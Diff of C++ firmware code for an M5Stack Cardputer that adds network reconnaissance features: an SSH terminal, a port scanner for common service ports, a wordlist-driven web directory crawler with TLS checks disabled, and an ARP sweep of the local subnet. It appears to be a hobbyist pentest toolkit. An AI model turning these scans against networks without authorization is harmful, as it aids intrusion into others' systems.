+              cursorY += lineHeight;
+              currentLine++;
+              if (cursorY >= displayHeight) {
+                M5Cardputer.Display.scroll(0, -lineHeight);
+                cursorY = displayHeight - lineHeight;
+                currentLine = totalLines - 1;
+              }
+              cursorX = 0;
+              M5Cardputer.Display.setCursor(cursorX, cursorY);
+              M5Cardputer.Display.print(commandBuffer);
+            }
+          }
+
+          M5Cardputer.Display.display();
+          lastKeyPressMillis = currentMillis;
+        }
+      }
+    }
+
+    char buffer[1024];
+    int nbytes = ssh_channel_read_nonblocking(channel, buffer, sizeof(buffer), 0);
+    if (nbytes > 0) {
+      String output = "";
+      for (int i = 0; i < nbytes; ++i) {
+        output += buffer[i];
+      }
+
+      output = removeANSIEscapeCodes(output);
+
+      for (int i = 0; i < output.length(); ++i) {
+        if (output[i] == '\r') {
+          continue;
+        } else if (output[i] == '\n') {
+          cursorY += lineHeight;
+          currentLine++;
+          if (cursorY >= displayHeight) {
+            M5Cardputer.Display.scroll(0, -lineHeight);
+            cursorY = displayHeight - lineHeight;
+            currentLine = totalLines - 1;
+          }
+          cursorX = 0;
+          M5Cardputer.Display.setCursor(cursorX, cursorY);
+        } else {
+          M5Cardputer.Display.print(output[i]);
+          cursorX += 6;
+          if (cursorX >= displayWidth) {
+            cursorX = 0;
+            cursorY += lineHeight;
+            currentLine++;
+            if (cursorY >= displayHeight) {
+              M5Cardputer.Display.scroll(0, -lineHeight);
+              cursorY = displayHeight - lineHeight;
+              currentLine = totalLines - 1;
+            }
+            M5Cardputer.Display.setCursor(cursorX, cursorY);
+          }
+        }
+      }
+      M5Cardputer.Display.display();
+
+      Serial.print("Output received: ");
+      Serial.println(output);
+    }
+
+    if (nbytes < 0 || ssh_channel_is_closed(channel)) {
+      Serial.println("SSH channel closed or error occurred.");
+      break;
+    }
+  }
+
+  // Close the SSH session and free resources
+  ssh_channel_close(channel);
+  ssh_channel_free(channel);
+  ssh_disconnect(my_ssh_session);
+  ssh_free(my_ssh_session);
+
+  vTaskDelete(NULL);
+}
+
+// connect to SSH End
+
+// scan single IP
+
+void scanIpPort() {
+  if (WiFi.localIP().toString() == "0.0.0.0") {
+    waitAndReturnToMenu("Not connected...");
+    return;
+  }
+  M5.Display.clear();
+  M5.Display.setCursor(0, 10);
+  M5.Display.println("Enter IP Address:");
+  M5.Display.setCursor(0, M5Cardputer.Display.height() - 20);
+  M5.Display.println("Current IP:" + WiFi.localIP().toString());
+  scanIp = getUserInput();
+
+  IPAddress ip;
+  if (ip.fromString(scanIp)) {
+    scanPorts(ip);
+  } else {
+    M5.Display.clear();
+    M5.Display.setCursor(0, 10);
+    M5.Display.println("Invalid IP Address");
+    delay(1000); // Afficher le message pendant 1 secondes
+
+  }
+  waitAndReturnToMenu("Return to menu");
+}
+
+// scan single IP end
+
+
+// Web crawling
+std::vector<String> urlList;  // Dynamic list for URLs
+int startIndex = 0;           // Start index for display
+const int maxDisplayLines = 11; // Maximum number of lines to display at a time
+String urlBase = "";
+
+void displayUrls() {
+  M5.Display.clear();
+  M5.Display.setCursor(0, 0);
+
+  int displayCount = std::min(maxDisplayLines, (int)urlList.size());
+  for (int i = 0; i < displayCount; ++i) {
+    int displayIndex = (startIndex + i) % urlList.size();
+    M5.Display.setCursor(0, 10 + i * 10);
+    M5.Display.println(urlList[displayIndex]);
+  }
+
+  // Display position indicator
+  M5.Display.setCursor(0, 0);
+  M5.Display.printf(" %d-%d of %d on %s\n", startIndex + 1, startIndex + displayCount, urlList.size(), urlBase.c_str());
+}
+
+void addUrl(const String &url) {
+  urlList.push_back(url);
+  if (urlList.size() > maxDisplayLines) {
+    startIndex = urlList.size() - maxDisplayLines;
+  }
+  displayUrls();
+}
+
+void scrollUp() {
+  if (startIndex > 0) {
+    startIndex--;
+    displayUrls();
+  }
+}
+
+void scrollDown() {
+  if (startIndex + maxDisplayLines < urlList.size()) {
+    startIndex++;
+    displayUrls();
+  }
+}
+
+void webCrawling(const IPAddress &ip) {
+  webCrawling(ip.toString());
+}
+
+bool handleHttpResponse(HTTPClient &http, String &url) {
+  int httpCode = http.GET();
+  if (httpCode == 301 || httpCode == 302) {
+    String newLocation = http.getLocation();
+    if (confirmPopup("Redirection detected. Follow?\n" + newLocation)) {
+      M5.Display.setTextSize(1);
+      url = newLocation.startsWith("/") ? url.substring(0, url.indexOf('/', 8)) + newLocation : newLocation;
+      return true;
+    }
+  }
+  return (httpCode == 200);
+}
+
+void setupHttpClient(HTTPClient &http, WiFiClient &client, WiFiClientSecure &secureClient, String &url) {
+  if (url.startsWith("https://")) {
+    secureClient.setInsecure();
+    http.begin(secureClient, url);
+  } else {
+    http.begin(client, url);
+  }
+  http.setTimeout(200); // Set timeout to 500 milliseconds
+}
+
+void webCrawling(const String &urlOrIp) {
+  enterDebounce();
+  startIndex = 0;
+  urlList.clear();  // Clear the URL list at the start of crawling
+  M5.Display.setTextColor(WHITE, BLACK);
+  M5.Display.setTextSize(1);
+
+  // Mettre à jour la variable globale `urlBase`
+  if (urlOrIp.isEmpty()) {
+    M5.Display.clear();
+    M5.Display.setCursor(0, 10);
+    M5.Display.println("Enter IP or Domain:");
+    urlBase = getUserInput();
+    M5.Display.setTextSize(1);
+  } else {
+    urlBase = urlOrIp;
+  }
+
+  // Vérifier si l'entrée utilisateur est une adresse IP valide
+  IPAddress ip;
+  if (ip.fromString(urlBase)) {
+    urlBase = "http://" + urlBase;
+  } else if (!urlBase.startsWith("http://") && !urlBase.startsWith("https://")) {
+    urlBase = "http://" + urlBase;
+  }
+
+  WiFiClient client;
+  WiFiClientSecure secureClient;
+  HTTPClient http;
+  bool urlAccessible = false;
+
+  setupHttpClient(http, client, secureClient, urlBase);
+  if (handleHttpResponse(http, urlBase)) {
+    urlAccessible = true;
+  } else if (urlBase.startsWith("http://") && confirmPopup("HTTP not accessible. Try HTTPS?")) {
+    M5.Display.setTextSize(1);
+    M5.Display.clear();
+    M5.Display.setCursor(0, 10);
+    M5.Display.println("Setup Https...");
+    urlBase.replace("http://", "https://");
+    setupHttpClient(http, client, secureClient, urlBase);
+    if (handleHttpResponse(http, urlBase)) {
+      urlAccessible = true;
+    }
+  }
+
+  if (!urlAccessible) {
+    M5.Display.clear();
+    M5.Display.setCursor(0, 10);
+    M5.Display.println("URL not accessible.");
+    delay(3000);  // Afficher le message pendant 3 secondes
+    waitAndReturnToMenu("Returning to menu...");
+    return;  // Return to the menu
+  }
+
+  displayUrls();
+
+  File file = SD.open("/crawler_wordlist.txt");
+  if (!file) {
+    M5.Display.clear();
+    M5.Display.setCursor(0, 10);
+    M5.Display.println("Failed to open file for reading");
+    delay(2000);  // Afficher le message pendant 2 secondes
+    return;
+  }
+
+  Serial.println("-------- Starting crawling on :" + urlBase);
+  while (file.available()) {
+    M5.update();
+    M5Cardputer.update();
+    String path = file.readStringUntil('\n');
+    path.trim();
+    if (path.length() > 0) {
+      String fullUrl = urlBase;
+      if (!urlBase.endsWith("/")) {
+        fullUrl += "/";
+      }
+      fullUrl += path;
+      Serial.println("Testing path: " + fullUrl);
+      M5.Display.setCursor(0, M5.Display.height() - 10);
+      M5.Display.println("On: /" + path + "                                                             ");
+      setupHttpClient(http, client, secureClient, fullUrl);
+      if (http.GET() == 200) {
+        addUrl(path);  // Ajouter l'URL à la liste et mettre à jour l'affichage
+        Serial.println("------------------------------------ Path that respond 200 : /" + fullUrl);
+      }
+    }
+    if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
+      M5.Display.setCursor(0, M5.Display.height() - 10);
+      M5.Display.println("Crawling Stopped!");
+      enterDebounce();
+      break;  // Quitter la boucle
+    }
+  }
+
+  file.close();
+  M5.Display.setCursor(0, M5.Display.height() - 10);
+  M5.Display.println("Finished Crawling!");
+
+  while (true) {
+    M5.update();
+    M5Cardputer.update();
+
+    if (M5Cardputer.Keyboard.isKeyPressed(';')) {
+      scrollUp();
+    } else if (M5Cardputer.Keyboard.isKeyPressed('.')) {
+      scrollDown();
+    } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
+      urlBase = "";
+      M5.Display.setTextSize(1.5);
+      waitAndReturnToMenu("Returning to menu...");
+      break;  // Quitter la boucle
+    } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
+      M5.Display.setTextSize(1.5);
+      urlBase = "";
+      waitAndReturnToMenu("Returning to menu...");
+      return;  // Return to the menu
+    }
+    delay(100);
+  }
+  http.end();
+  waitAndReturnToMenu("Returning to menu...");
+  M5.Display.setTextSize(1.5);
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+// Scan des hôtes
+
+// Déclarations des fonctions ARP
+void read_arp_table(char * from_ip, int read_from, int read_to, std::vector<IPAddress>& hostslist);
+void send_arp(char * from_ip, std::vector<IPAddress>& hostslist);
+
+// Fonction pour enregistrer les résultats ARP
+void logARPResult(IPAddress host, bool responded) {
+  char buffer[64];
+  if (responded) {
+    sprintf(buffer, "Host %s respond to ARP.", host.toString().c_str());
+  } else {
+    sprintf(buffer, "Host %s did not respond to ARP.", host.toString().c_str());
+  }
+  Serial.println(buffer);
+}
+
+// Fonction pour effectuer une requête ARP
+bool arpRequest(IPAddress host) {
+  char ipStr[16];
+  sprintf(ipStr, "%s", host.toString().c_str());
+  ip4_addr_t test_ip;
+  ipaddr_aton(ipStr, (ip_addr_t*)&test_ip);
+
+  struct eth_addr *eth_ret = NULL;
+  const ip4_addr_t *ipaddr_ret = NULL;
+  bool responded = etharp_find_addr(NULL, &test_ip, &eth_ret, &ipaddr_ret) >= 0;
+  logARPResult(host, responded);
+  return responded;
+}
+
+
+void scanHosts() {
+  local_scan_setup();
+  waitAndReturnToMenu("Return to menu");
+}
+
+void local_scan_setup() {
+  if (WiFi.localIP().toString() == "0.0.0.0") {
+    waitAndReturnToMenu("Not connected...");
+    return;
+  }
+
+  enterDebounce();
+  IPAddress gatewayIP;
+  IPAddress subnetMask;
+  std::vector<IPAddress> hostslist;
+  M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
+  M5.Display.setTextSize(1.5);
+
+  gatewayIP = WiFi.gatewayIP();
+  subnetMask = WiFi.subnetMask();
+
+  IPAddress network = WiFi.localIP();
+  network[3] = 0;
+  M5.Display.clear();
+  int numHosts = 254 - subnetMask[3];
+  M5.Display.setCursor(0, M5.Display.height() / 2);
+  M5.Display.println("Probing " + String(numHosts) + " hosts with ARP");
+  M5.Display.println("       please wait...");
+
+  bool foundHosts = false;
+  bool stopScan = false; // Variable pour vérifier si ENTER est pressé
+
+  // Préparer l'adresse de base pour les requêtes ARP
+  char base_ip[16];
+  sprintf(base_ip, "%d.%d.%d.", network[0], network[1], network[2]);
+
+  // Envoyer les requêtes ARP à tout le réseau
+  send_arp(base_ip, hostslist);
+
+  // Lire la table ARP pour détecter les hôtes actifs
+  read_arp_table(base_ip, 1, numHosts, hostslist);
+
+  // Parcourir la table ARP et afficher les résultats
+  for (int i = 1; i <= numHosts; i++) {
+    if (stopScan) {
+      break; // Sortir de la boucle si ENTER est pressé
+    }
+
+    IPAddress currentIP = network;
+    currentIP[3] = i;
+
+    if (arpRequest(currentIP)) {
+      hostslist.push_back(currentIP);
+      foundHosts = true;
+    }
+  }
+
+  if (!foundHosts) {
+    M5.Display.println("No hosts found.");
+    delay(2000); // Display message for 2 seconds
+    return;
+  }
+
+  displayHostOptions(hostslist);
+}
+
+// Implementation des fonctions ARP
+void read_arp_table(char * from_ip, int read_from, int read_to, std::vector<IPAddress>& hostslist) {
+  Serial.printf("Reading ARP table from: %d to %d\n", read_from, read_to);
+  for (int i = read_from; i <= read_to; i++) {
+    char test[32];
+    sprintf(test, "%s%d", from_ip, i);
+    ip4_addr_t test_ip;
+    ipaddr_aton(test, (ip_addr_t*)&test_ip);
+
+    const ip4_addr_t *ipaddr_ret = NULL; // Modification ici
+    struct eth_addr *eth_ret = NULL;
+    if (etharp_find_addr(NULL, &test_ip, &eth_ret, &ipaddr_ret) >= 0) {
+      IPAddress foundIP;
+      foundIP.fromString(ipaddr_ntoa((ip_addr_t*)&test_ip));
+      hostslist.push_back(foundIP);
+      Serial.printf("Adding found IP: %s\n", ipaddr_ntoa((ip_addr_t*)&test_ip));
+    }
+  }
+}
+
+void send_arp(char * from_ip, std::vector<IPAddress>& hostslist) {
+  Serial.println("Sending ARP requests to the whole network");
+  const TickType_t xDelay = (10) / portTICK_PERIOD_MS; // Délai de 0.01 secondes
+  void * netif = NULL;
+  tcpip_adapter_get_netif(TCPIP_ADAPTER_IF_STA, &netif);
+  struct netif *netif_interface = (struct netif *)netif;
+
+  for (char i = 1; i < 254; i++) {
+    char test[32];
+    sprintf(test, "%s%d", from_ip, i);
+    ip4_addr_t test_ip;
+    ipaddr_aton(test, (ip_addr_t*)&test_ip);
+
+    // Envoyer la requête ARP
+    int8_t arp_request_ret = etharp_request(netif_interface, &test_ip);
+    vTaskDelay(xDelay); // Délai
+  }
+  // Lire toutes les entrées de la table ARP
+  read_arp_table(from_ip, 1, 254, hostslist);
+}
+
+
+void displayHostOptions(const std::vector<IPAddress>& hostslist) {
+  enterDebounce();
+  std::vector<std::pair<std::string, std::function<void()>>> options;
+  Serial.println("Hosts that responded to ARP:");
+  for (IPAddress ip : hostslist) {
+    String txt = ip.toString();
+    options.push_back({ txt.c_str(), [ = ]() {
+      afterScanOptions(ip, hostslist);
+    }
+                      });
+    Serial.println(txt);
+  }
+
+  bool scanninghost = true;
+  int index = 0;
+  int lineHeight = 12; // Hauteur de ligne pour chaque option //here
+
+  while (!M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
+    M5.update(); // Mise à jour du clavier
+    M5Cardputer.update(); // Mise à jour du clavier
+
+    if (scanninghost) {
+      // Clear screen
+      M5.Display.clear();
+      M5.Display.setCursor(0, 0);
+
+      // Display options
+      for (int i = 0; i < options.size(); ++i) {
+        if (i == index) {
+          M5.Display.fillRect(0, i * lineHeight, M5.Display.width(), lineHeight, TFT_NAVY);
+          M5.Display.setTextColor(TFT_GREEN, TFT_NAVY);
+        } else {
+          M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
+        }
+        M5.Display.setCursor(0, i * lineHeight);
+        M5.Display.println(options[i].first.c_str());
+      }
+
+      scanninghost = false;
+    }
+
+    // Check for user input
+    if (M5Cardputer.Keyboard.isKeyPressed(';')) {
+      index = (index > 0) ? index - 1 : options.size() - 1;
+      scanninghost = true;
+      delay(200); // Debounce delay
+    }
+    if (M5Cardputer.Keyboard.isKeyPressed('.')) {
+      index = (index < options.size() - 1) ? index + 1 : 0;
+      scanninghost = true;
+      delay(200); // Debounce delay
+    }
+    if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
+      Serial.print("Selected option: ");
+      Serial.println(options[index].first.c_str());
+      options[index].second(); // Execute the function associated with the option
+      break; // Exit loop after executing the selected option
+    }
+    if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
+      return; // Exit loop after executing the selected option
+    }
+
+    delay(100); // Small delay to avoid CPU overload
+  }
+}
+
+//from https://github.com/pr3y/bruce and refactored  
+void afterScanOptions(IPAddress ip, const std::vector<IPAddress>& hostslist) {
+  enterDebounce();
+  std::vector<std::pair<std::string, std::function<void()>>> option;
+  option = {
+    { "Scan Ports", [ = ]() {
+        scanPorts(ip);
+        displayHostOptions(hostslist); // Return to host options after port scan
+      }
+    },
+    { "SSH Connect", [ = ]() {
+        sshConnect(ip.toString().c_str());
+        displayHostOptions(hostslist); // Return to host options after SSH connect
+      }
+    },
+    { "Web Crawling", [ = ]() {
+        webCrawling(ip);
+        displayHostOptions(hostslist); // Return to host options after web crawling
+      }
+    },
+  };
+
+  bool scanninghost = true;
+  int index = 0;
+  int lineHeight = 12; // Hauteur de ligne pour chaque option
+
+  while (1) {
+    M5.update(); // Mise à jour du clavier
+    M5Cardputer.update(); // Mise à jour du clavier
+
+    if (scanninghost) {
+      // Clear screen
+      M5.Display.clear();
+      M5.Display.setCursor(0, 0);
+
+      // Display options
+      for (int i = 0; i < option.size(); ++i) {
+        if (i == index) {
+          M5.Display.fillRect(0, i * lineHeight, M5.Display.width(), lineHeight, TFT_NAVY);
+          M5.Display.setTextColor(TFT_GREEN, TFT_NAVY);
+        } else {
+          M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
+        }
+        M5.Display.setCursor(0, i * lineHeight);
+        M5.Display.println(String(i + 1) + ". " + option[i].first.c_str());
+      }
+
+      scanninghost = false;
+    }
+
+    // Check for user input
+    if (M5Cardputer.Keyboard.isKeyPressed(';')) {
+      index = (index > 0) ? index - 1 : option.size() - 1;
+      scanninghost = true;
+      delay(200); // Debounce delay
+    }
+    if (M5Cardputer.Keyboard.isKeyPressed('.')) {
+      index = (index < option.size() - 1) ? index + 1 : 0;
+      scanninghost = true;
+      delay(200); // Debounce delay
+    }
+    if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
+      Serial.print("Selected option: ");
+      Serial.println(option[index].first.c_str());
+      option[index].second(); // Execute the function associated with the option
+      break; // Exit loop after executing the selected option
+    }
+    if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
+      displayHostOptions(hostslist); // Return to host options
+      return;
+    }
+
+    delay(100);
+  }
+  delay(200);
+}
+
+
+//from https://github.com/pr3y/bruce and refactored  
+void scanPorts(IPAddress host) {
+  enterDebounce();
+  WiFiClient client;
+  const int ports[] = {20, 21, 22, 23, 25, 80, 137, 139, 443, 445, 3306, 3389, 8080, 8443, 9090};
+  const int numPorts = sizeof(ports) / sizeof(ports[0]);
+  M5.Display.clear();
+  M5.Display.setTextSize(1.5);
+  M5.Display.setCursor(1, 20);
+  M5.Display.print("Host: " + host.toString());
+  M5.Display.setCursor(1, 34);
+  M5.Display.println("Ports Open: ");
+  M5.Display.println("");
+  for (int i = 0; i < numPorts; i++) {
+    int port = ports[i];
+    if (client.connect(host, port)) {
+      M5.Display.print(port);
+      M5.Display.print(", ");
+      Serial.println("Port " + String(port) + " Open");
+      client.stop();
+    } else {
+      M5.Display.print("*");
+      M5.Display.print(", ");
+    }
+  }
+  M5.Display.setCursor(1, M5.Display.getCursorY() + 16);
+  M5.Display.print("Finished!");
+  while (!M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
+    M5.update();
+    M5Cardputer.update();
+    delay(10); // Petit délai pour réduire la charge du processeur
+  }
+  enterDebounce();
+}
+
+//Scan hosts
